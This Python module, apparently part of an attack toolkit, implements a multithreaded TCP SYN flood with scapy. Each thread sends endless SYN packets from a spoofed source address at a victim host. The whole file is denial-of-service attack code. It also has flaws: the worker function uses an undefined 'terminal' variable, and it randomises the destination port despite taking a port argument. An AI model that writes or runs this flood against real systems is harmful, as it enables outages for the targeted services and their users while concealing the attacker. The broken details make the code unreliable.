import threading
from scapy.all import *
from random import randint
from func.spoof_addr import spoof_addr

def SYNflood(victim,port,quiet,THREAD_COUNT,terminal = None):
    if terminal == None:
        print("[+] Flooding "+victim+" with TCP SYN packets on port "+str(port))
    else:
        terminal.configure(text=terminal.cget("text")+'\n[+] Flooding '+victim+" with TCP SYN packets on port "+str(port))
    all_threads = []
    tc = THREAD_COUNT 
    spoofaddr = spoof_addr(terminal=terminal)
    for i in range(tc):
        t = threading.Thread(target=__floodtarget,args=(victim,port,spoofaddr,quiet))
        t.start()
        all_threads.append(t)

def __floodtarget(victim,port,spoof_addr,quiet):
    while 1:
        packet = IP(src=spoof_addr,dst=victim)/TCP(flags='S',sport = randint(1,65535),dport = randint(1,65535))
        send(packet, verbose = 0)    
        if not quiet:
            if terminal == None:
                print("[+] Sent packet "+str(packet.show()))
            else:
                terminal.configure(text=terminal.cget("text")+'\n[+] Sent packet '+str(packet.show()))
